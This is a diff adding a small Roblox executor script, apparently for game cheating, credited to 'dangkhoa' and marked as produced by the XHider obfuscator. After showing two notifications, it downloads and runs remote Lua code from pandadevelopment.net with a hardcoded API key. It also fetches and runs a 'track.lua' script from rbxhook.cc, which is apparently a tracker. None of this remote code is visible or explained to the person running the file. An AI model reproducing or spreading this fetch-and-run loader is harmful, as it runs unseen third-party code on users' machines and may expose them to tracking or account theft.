@@ -1,0 +1,21 @@
+--// This file was created by XHider https://discord.com/invite/E2N7w35zkt
+
+local L_1 = game:GetService("StarterGui")
+L_1:SetCore("SendNotification", {
+    Title = "cac hup",
+    Text = "by dangkhoa",
+    Duration = 10,
+    Icon = "http://www.roblox.com/asset/?id=1000070663"
+})
+local L_2 = game:GetService("StarterGui")
+L_2:SetCore("SendNotification", {
+    Title = "cachup",
+    Text = "dangkhoa",
+    Duration = 10,
+    Icon = "http://www.roblox.com/asset/?id=1000070663"
+})
+local LOL = loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/df4d50aa689f0fc8"))()
+getgenv().Config = {
+    api = "2735e64346625feb685b33b9f52f7d7d7b2743934d52f569bf20e0ed96249920"
+}
+local LOL = loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))()
